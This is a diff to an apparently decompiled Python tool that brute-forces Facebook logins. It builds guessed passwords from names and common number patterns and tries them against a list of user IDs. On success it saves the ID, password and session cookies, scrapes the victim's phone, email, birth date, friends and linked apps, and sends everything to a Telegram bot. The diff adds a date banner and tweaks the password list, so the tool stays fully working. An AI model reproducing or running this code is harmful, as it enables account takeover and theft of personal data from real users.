@@ -1,4 +1,4 @@
-
+#• DeCoDe By @H_S_W_M •
 M = '\x1b[1;93m'
 B = '\x1b[1;94m'
 U = '\x1b[1;95m'
@@ -156,7 +156,7 @@ print('')
 token = input('\x1b[1;31mT\x1b[1;32mO\x1b[1;33mK\x1b[1;34mE\x1b[1;36mN\x1b[1;35m :\x1b[1;32m ')
 print('\n')
 ID = input('\x1b[1;31mI\x1b[1;34mD \x1b[1;32m   : ')
-tlg1 = '\n -مرحبا بك في اداة لإختراق الحسابات المتاحة  \n━━━━━━━━❖━━━━━━━━━nn𝞩 \nتم تشغيل الاداة \n    \nستتوصل بالحسابات في هذا البوت 🫡 \n\n المطور:  MIMO \n channel:  MIMO X VIP'
+tlg1 = '\n -مرحبا بك في اداة لإختراق الحسابات المتاحة  \n━━━━━━━━❖━━━━━━━━━nn𝞩 \nتم تشغيل الاداة \n    \nستتوصل بالحسابات في هذا البوت 🫡 \n'
 requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg1))
 os.system('clear')
 os.system('clear')
@@ -691,7 +691,6 @@ O = '\x1b[1;96m'
 N = '\x1b[0m'
 H = '\x1b[1;92m'
 K = '\x1b[1;93m'
-
 logo = ('''[107;40m[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;215m%[38;5;215m%[38;5;221m%[38;5;221m%[38;5;215m%[38;5;215m%[38;5;221m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;221m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%
 [38;5;221m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;221m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;221m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%
 [38;5;221m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;221m%[38;5;215m%[38;5;215m%[38;5;216m%[38;5;215m%[38;5;185m#[38;5;137m/[38;5;088m,[38;5;160m*[38;5;160m*[38;5;196m*[38;5;196m*[38;5;009m*[38;5;196m*[38;5;196m*[38;5;196m*[38;5;196m*[38;5;196m*[38;5;196m*[38;5;196m*[38;5;160m*[38;5;160m*[38;5;160m*[38;5;160m*[38;5;160m*[38;5;160m*[38;5;009m*[38;5;196m*[38;5;009m*[38;5;196m*[38;5;196m*[38;5;009m*[38;5;009m*[38;5;160m*[38;5;160m*[38;5;160m*[38;5;124m,[38;5;001m,[38;5;238m,[38;5;137m([38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m#[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;221m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%
@@ -808,6 +807,21 @@ def SD_YASIR():
         print('')
         print(('\x1b[38;5;225m▬'*100)+'\n\n'+('\x1b[1;31m▬'*100))
         print('\n')
+        time1 = time.localtime()
+        time2 = time.strftime('''%d/%m/%Y''')
+        print('')
+        time3 = time.strftime('''%H:%M:%S''')
+        print(('\x1b[1;31m▬'*80)+'\n\n'+('\x1b[1;31m▬'*80))
+        output = render('M I M O', colors=['white', 'blue'], align='center')
+        print(output)
+        print(('\x1b[1;31m▬'*80)+'\n\n'+('\x1b[1;31m▬'*80))
+        print('\n')
+        print('')
+        print(f'''{C}: \x1b[38;5;92m 𝐓𝐇𝐄 𝐃𝐀𝐓𝐄 \x1b[1;38;5;121m ๛   \x1b[1;38;5;121m   𖣎 \x1b[1;96m{time2} \x1b[1;38;5;121m 𖣎''')
+        print('')
+        print(f'''{C}: \x1b[38;5;92m 𝑇𝐻𝐸 𝑇𝐼𝑀𝐸 \x1b[1;38;5;121m ๛   \x1b[1;38;5;121m   𖣎 \x1b[1;96m{time3} \x1b[1;38;5;121m 𖣎''')
+        print('')        
+        
         print('\n   \033[0m\033[1;93m [\033[1;93m\033[1;44m  𝗜𝗢𝗚i𝗡 i𝗡𝗙𝗢  :  معلومات المستخدم\033[0m\033[1;93m]\n')
         try:
         	gep = requests.get('http://ipinfo.io/json').json()
@@ -827,6 +841,8 @@ def SD_YASIR():
         	print(g67+'━'*67)
         	print('')
         fileX = input(f''' {L}F {K}I {B}L {Z}E {kk}  N{hh} A{a26} M{a31} E {M}:{H} ''')
+        print('')
+        print('')
         for line in open(fileX, 'r').readlines():
             id.append(line.strip())
         setting()
@@ -935,16 +951,10 @@ def passwrd():
                     pwv.append(frs + '1997')
                     pwv.append(frs + '1212')
                     pwv.append(frs+'123'+frs)
-                    pwv.append(frs+'1234'+frs)
-                    pwv.append('123'+frs)
                     pwv.append('1234'+frs)
-                    pwv.append('12345'+frs)
-                    pwv.append('123456'+frs)
                     pwv.append('19941994')
                     pwv.append('19991999')
                     pwv.append('19981998')
-                    pwv.append('123456123456')
-                    pwv.append('1122334455')
                     pwv.append('20012001')
                     pwv.append('20002000')
                     pwv.append('20022002')
@@ -954,6 +964,7 @@ def passwrd():
                     pwv.append('20202020')
                     pwv.append('20232023')
                     pwv.append('20222022')
+                    pwv.append('12345qwerty')
             elif len(frs) < 3:
                 pwv.append(nmf)
             else:
@@ -1010,6 +1021,8 @@ def passwrd():
                     pwv.append('20202020')
                     pwv.append('20232023')
                     pwv.append('20222022')
+                    
+                
             if 'ya' in pwpluss:
                 for xpwd in pwnya:
                     pwv.append(xpwd)
@@ -1040,7 +1053,7 @@ def crack(idf, pwv):
     print('\r%s [𝙼𝙸𝙼𝙾 𝐕𝐈𝐏] %s/%s || [ 𝐎𝐊 ] - %s || [𝐶𝑃] - %s || %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
-    ses = requests.Session()#
+    ses = requests.Session()
     for pw in pwv:
         
         try:
@@ -1124,90 +1137,90 @@ BY = @mx1mq'''
                     requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statusok))
             
     
-            if 'ya' in taplikasi:
-                ok += 1
-                coki = po.cookies.get_dict()
-                kuki = ';'.join([f"{key}={value}" for key, value in ses.cookies.get_dict().items()])
-
-                open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
-                user = idf
-                infoakun = ''
-                session = requests.Session()
-                get_id = session.get('https://m.facebook.com/profile.php', cookies=coki, headers=headapp).text
-                nama = re.findall('\\<title\\>(.*?)<\\/title\\>', str(get_id))[0]
-                response = session.get('https://m.facebook.com/profile.php?v=info', cookies=coki, headers=headapp).text
-                response2 = session.get('https://m.facebook.com/profile.php?v=friends', cookies=coki, headers=headapp).text
-                response3 = session.get(f'''https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_''', cookies=coki, headers=headapp).text
-                response4 = session.get(f'''https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr''', cookies=coki, headers=headapp).text
-                
-                try:
-                    nomer = re.findall('\\<a\\ href\\="tel\\:\\+.*?">\\<span\\ dir\\="ltr">(.*?)<\\/span><\\/a>', str(response))[0]
-                except:
-                    nomer = ''
-                
-                try:
-                    email = re.findall('\\<a href\\="https\\:\\/\\/lm\\.facebook\\.com\\/l\\.php\\?u\\=mail.*?" target\\=".*?"\\>(.*?)<\\/a\\>', str(response))[0].replace('&#064;', '@')
-                except:
-                    email = ''
-                
-                try:
-                    ttl = re.findall('\\<\\/td\\>\\<td\\ valign\\="top" class\\=".*?"\\>\\<div\\ class\\=".*?"\\>(\\d+\\s+\\w+\\s+\\d+)<\\/div\\>\\<\\/td\\>\\<\\/tr\\>', str(response))[0]
-                except:
-                    ttl = ''
-                
-                try:
-                    teman = re.findall('\\<h3\\ class\\=".*?"\\>Teman\\ \\((.*?)\\)<\\/h3\\>', str(response2))[0]
-                except:
-                    teman = ''
-                
-                try:
-                    pengikut = re.findall('\\<span\\ class\\=".*?"\\>(.*?)\\<\\/span\\>', str(response4))[1]
-                except:
-                    pengikut = ''
-                
-                try:
-                    tahun = ''
-                    cek_thn = re.findall('\\<div\\ class\\=".*?" id\\="year_(.*?)">', str(response3))
-                    for nenen in cek_thn:
-                        tahun += nenen + ', '
-                except:
-                    infoakun += f'''ميمو جابلك حساب صحيح تعال 
+                if 'ya' in taplikasi:
+                    ok += 1
+                    coki = po.cookies.get_dict()
+                    kuki = ';'.join([f"{key}={value}" for key, value in ses.cookies.get_dict().items()])
+    
+                    open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
+                    user = idf
+                    infoakun = ''
+                    session = requests.Session()
+                    get_id = session.get('https://m.facebook.com/profile.php', cookies=coki, headers=headapp).text
+                    nama = re.findall('\\<title\\>(.*?)<\\/title\\>', str(get_id))[0]
+                    response = session.get('https://m.facebook.com/profile.php?v=info', cookies=coki, headers=headapp).text
+                    response2 = session.get('https://m.facebook.com/profile.php?v=friends', cookies=coki, headers=headapp).text
+                    response3 = session.get(f'''https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_''', cookies=coki, headers=headapp).text
+                    response4 = session.get(f'''https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr''', cookies=coki, headers=headapp).text
+                    
+                    try:
+                        nomer = re.findall('\\<a\\ href\\="tel\\:\\+.*?">\\<span\\ dir\\="ltr">(.*?)<\\/span><\\/a>', str(response))[0]
+                    except:
+                        nomer = ''
+                    
+                    try:
+                        email = re.findall('\\<a href\\="https\\:\\/\\/lm\\.facebook\\.com\\/l\\.php\\?u\\=mail.*?" target\\=".*?"\\>(.*?)<\\/a\\>', str(response))[0].replace('&#064;', '@')
+                    except:
+                        email = ''
+                    
+                    try:
+                        ttl = re.findall('\\<\\/td\\>\\<td\\ valign\\="top" class\\=".*?"\\>\\<div\\ class\\=".*?"\\>(\\d+\\s+\\w+\\s+\\d+)<\\/div\\>\\<\\/td\\>\\<\\/tr\\>', str(response))[0]
+                    except:
+                        ttl = ''
+                    
+                    try:
+                        teman = re.findall('\\<h3\\ class\\=".*?"\\>Teman\\ \\((.*?)\\)<\\/h3\\>', str(response2))[0]
+                    except:
+                        teman = ''
+                    
+                    try:
+                        pengikut = re.findall('\\<span\\ class\\=".*?"\\>(.*?)\\<\\/span\\>', str(response4))[1]
+                    except:
+                        pengikut = ''
+                    
+                    try:
+                        tahun = ''
+                        cek_thn = re.findall('\\<div\\ class\\=".*?" id\\="year_(.*?)">', str(response3))
+                        for nenen in cek_thn:
+                            tahun += nenen + ', '
+                    except:
+                        infoakun += f'''ميمو جابلك حساب صحيح تعال 
 ⋘─────━𓆩𝙼𝙸𝙼𝙾𓆪‏━─────⋙
 ❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n<><><><><><><><><><><><><><>\n❖ - Jumlah Teman : {teman}\n❖ - Jumlah Pengikut : {pengikut}\n❖ - Email Aktif : {email}\n❖ - Nomor Aktif : {nomer}\n❖ - Tahun Akun : {tahun}\n❖ - Tanggal Lahir : {ttl}\n└──⌯ - Cokies: {kuki}\n
 ⋘─────━𓆩𝙼𝙸𝙼𝙾𓆪‏━─────⋙
 BY = @mx1mq '''
-                requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(infoakun))
-                (hit1, hit2) = (0, 0)
-                cek = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', cookies=coki, headers=headapp).text
-                cek2 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=inactive', cookies=coki, headers=headapp).text
-                if 'Diakses menggunakan Facebook' in re.findall('\\<title\\>(.*?)<\\/title\\>', str(cek)):
-                    infoakun += 'Aplikasi Yang Terkait*\n'
-                    if 'Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau.' in cek:
-                        infoakun += 'Tidak Ada Aplikasi Aktif Yang Terkait *\n'
-                    else:
-                        infoakun += '\tAplikasi Aktif : \n'
-                        apkAktif = re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek))
-                        ditambahkan = re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek))
-                        for muncul in apkAktif:
-                            hit1 += 1
-                            infoakun += f'''\t\t[{hit1}] {muncul} {ditambahkan[hit2]}\n'''
-                            hit2 += 1
-                    if 'Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau' in cek2:
-                        infoakun += '\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n'
-                    else:
-                        (hit1, hit2) = (0, 0)
-                        infoakun += '\tAplikasi Kedaluwarsa :\n'
-                        apkKadaluarsa = re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek2))
-                        kadaluarsa = re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek2))
-                        for muncul in apkKadaluarsa:
-                            hit1 += 1
-                            infoakun += f'''\t\t[{hit1}] {muncul} {kadaluarsa[hit2]}\n'''
-                            hit2 += 1
-                print('\n')
-                statusok = f'''\t\t\t\t\t\n   \n{infoakun}\t\t\t\t\t\n\t\t\t\t\t'''
-                statusok1 = nel(statusok, style='green')
-                cetak(nel(statusok1, title='OK'))
-                cek_mimo(kuki)
+                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(infoakun))
+                    (hit1, hit2) = (0, 0)
+                    cek = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', cookies=coki, headers=headapp).text
+                    cek2 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=inactive', cookies=coki, headers=headapp).text
+                    if 'Diakses menggunakan Facebook' in re.findall('\\<title\\>(.*?)<\\/title\\>', str(cek)):
+                        infoakun += 'Aplikasi Yang Terkait*\n'
+                        if 'Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau.' in cek:
+                            infoakun += 'Tidak Ada Aplikasi Aktif Yang Terkait *\n'
+                        else:
+                            infoakun += '\tAplikasi Aktif : \n'
+                            apkAktif = re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek))
+                            ditambahkan = re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek))
+                            for muncul in apkAktif:
+                                hit1 += 1
+                                infoakun += f'''\t\t[{hit1}] {muncul} {ditambahkan[hit2]}\n'''
+                                hit2 += 1
+                        if 'Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau' in cek2:
+                            infoakun += '\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n'
+                        else:
+                            (hit1, hit2) = (0, 0)
+                            infoakun += '\tAplikasi Kedaluwarsa :\n'
+                            apkKadaluarsa = re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek2))
+                            kadaluarsa = re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek2))
+                            for muncul in apkKadaluarsa:
+                                hit1 += 1
+                                infoakun += f'''\t\t[{hit1}] {muncul} {kadaluarsa[hit2]}\n'''
+                                hit2 += 1
+                    print('\n')
+                    statusok = f'''\t\t\t\t\t\n   \n{infoakun}\t\t\t\t\t\n\t\t\t\t\t'''
+                    statusok1 = nel(statusok, style='green')
+                    cetak(nel(statusok1, title='OK'))
+                    cek_YASIR(kuki)
 
         except requests.exceptions.ConnectionError:
             time.sleep(31)
